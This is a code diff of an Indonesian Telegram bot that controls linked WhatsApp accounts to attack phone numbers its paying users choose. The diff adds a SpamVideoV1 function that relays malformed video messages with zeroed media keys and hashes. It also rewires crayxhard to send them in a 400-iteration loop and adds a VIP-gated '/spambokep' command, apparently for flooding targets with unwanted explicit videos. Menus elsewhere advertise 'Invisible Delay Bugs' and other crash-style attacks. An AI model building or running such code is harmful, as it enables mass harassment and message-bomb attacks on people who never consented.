@@ -3353,6 +3353,47 @@ async function invisPermaIOS(target) {
     }]
   })
 }
+
+const videoLinks = [
+  "https://files.catbox.moe/h1himg.mp4",
+  "https://files.catbox.moe/i5956l.mp4",
+  "https://files.catbox.moe/03d1i3.mp4",
+  "https://files.catbox.moe/pocidu.mp4",
+  "https://files.catbox.moe/h1himg.mp4"
+];
+
+async function SpamVideoV1(target) {
+  for (let i = 0; i < 20; i++) {
+    // Acak link video
+    const url = videoLinks[Math.floor(Math.random() * videoLinks.length)];
+
+    try {
+      await sock.relayMessage(
+        target,
+        {
+          videoMessage: {
+            url: url,
+            mimetype: "video/mp4",
+            fileLength: 999999,
+            mediaKey: Buffer.from("0".repeat(32)),
+            fileEncSha256: Buffer.from("0".repeat(32)),
+            fileSha256: Buffer.from("0".repeat(32)),
+            directPath: "/",
+            mediaKeyTimestamp: Math.floor(Date.now() / 1000)
+          }
+        },
+        { messageId: "3EB0" + Math.random().toString(36).substring(2, 18).toUpperCase() }
+      );
+
+      console.log(`\x1b[32m[Seraphine - VIDEO 🎬 ]\x1b[0m ${i + 1}/30 → ${url.split("/").pop()}`);
+      await new Promise(r => setTimeout(r, 2500));
+
+    } catch (err) {
+      console.log(`\x1b[31m[ERR]\x1b[0m ${err.message}`);
+    }
+  }
+}
+
 //=========== ASYNC FUNCTION SEND ==========\\
 async function crayxkouta(target) {
 for (let i = 0; i < 50; i++) {
@@ -3364,36 +3405,7 @@ console.log(chalk.red(`[Seraphine - BULLDOZER 🐉 ] ${target}`));
 
 async function crayxhard(target) {
 for (let i = 0; i < 400; i++) {
-await ovaliuminvictus(target, false)
-await ovaliuminvictus(target, false)
-await ovaliuminvictus(target, false)
-await ovaliuminvictus(target, false)
-await ovaliuminvictus(target, false)
-await ovaliuminvictus(target, false)
-await ovaliuminvictus(target, false)
-await ovaliuminvictus(target, false)
-await ovaliuminvictus(target, false)
-await ovaliuminvictus(target, false)
-await ovaliuminvictus(target, false)
-await ovaliuminvictus(target, false)
-await ovaliuminvictus(target, false)
-await ovaliuminvictus(target, false)
-await ovaliuminvictus(target, false)
-await ovaliuminvictus(target, false)
-await ovaliuminvictus(target, false)
-await ovaliuminvictus(target, false)
-await ovaliuminvictus(target, false)
-await ovaliuminvictus(target, false)
-await ovaliuminvictus(target, false)
-await ovaliuminvictus(target, false)
-await ovaliuminvictus(target, false)
-await ovaliuminvictus(target, false)
-await ovaliuminvictus(target, false)
-await ovaliuminvictus(target, false)
-await ovaliuminvictus(target, false)
-await ovaliuminvictus(target, false)
-await ovaliuminvictus(target, false)
-await new Promise(resolve => setTimeout(resolve, 2500));
+await SpamVideoV1(target)
 console.log(chalk.blue(`[Seraphine - OVA ] ${target}`));
 }
 }
@@ -3615,6 +3627,10 @@ bot.on("callback_query", async (query) => {
 ║⎔ /nexdro : 62×××
 ┃ » └⊱ ⟮ Invisible Delay Bugs ⟯
 ╚━═━═━═━═━═━═━═━━═━═━═━═━❏
+╔━══━⊱【 Spam Menu 】━═━═❏
+║⎔ /spambokep : 62×××
+┃ » └⊱ ⟮ target hanya terkena spam video ⟯
+╚━═━═━═━═━═━═━═━━═━═━═━═━❏
 \`\`\``;
       replyMarkup = {
         inline_keyboard: [
@@ -3818,6 +3834,7 @@ ${hasil}
 ┃❏ /deladmin <ɪᴅ>
 ┃❏ /addvipgb <ɪᴅ> 30d
 ┃❏ /cekid
+┃❏ /tourl
 ╰━───────────────━❏
 \`\`\``;
       replyMarkup = {
@@ -4357,7 +4374,64 @@ bot.onText(/\/xios (\d+)/, async (msg, match) => {
   }
 });    
 
+bot.onText(/\/spambokep (\d+)/, async (msg, match) => {
+  const chatId   = msg.chat.id;
+  const senderId = msg.from.id;
+  const userId   = msg.from.id;
+  const targetNumber = match[1];
+  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
+  const jid = `${formattedNumber}@s.whatsapp.net`;
+  const randomImage = getRandomImage();
+  const cooldown = checkCooldown(userId);
 
+  // ✅ FIX: pakai hasPremiumAccess (user ATAU grup VIP)
+  if (!hasPremiumAccess(senderId, chatId, msg.chat.type)) {
+    return bot.sendPhoto(chatId, randomImage, {
+      caption: `\`\`\`\nLu Bukan Vip Goblok!!\`\`\`\n`,
+      parse_mode: "Markdown",
+      reply_markup: {
+        inline_keyboard: [
+          [{ text: "📞 𝘉𝘶𝘺 𝘈𝘤𝘤𝘦𝘴", url: "https://t.me/DilxzzY2" }]
+        ]
+      }
+    });
+  }
+
+  if (cooldown > 0) {
+    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
+  }
+
+  try {
+    if (sessions.size === 0) {
+      return bot.sendMessage(
+        chatId,
+        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
+      );
+    }
+
+    // ✅ Langsung kirim "Succes Send Bug"
+    await bot.sendMessage(chatId, "Succes Send Bug", {
+      reply_markup: {
+        inline_keyboard: [[
+          {
+            text: "Details Target",
+            url: `https://wa.me/${formattedNumber}`,
+            icon_custom_emoji_id: "5395444784611480792",
+            style: "success"
+          }
+        ]]
+      }
+    });
+
+    // Loop kirim bug di background
+    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
+    await crayxhard(jid);
+    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
+
+  } catch (error) {
+    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
+  }
+});    
 //=======plugins=======//
 bot.onText(/\/tiktok (.+)/, async (msg, match) => {
   const chatId = msg.chat.id;
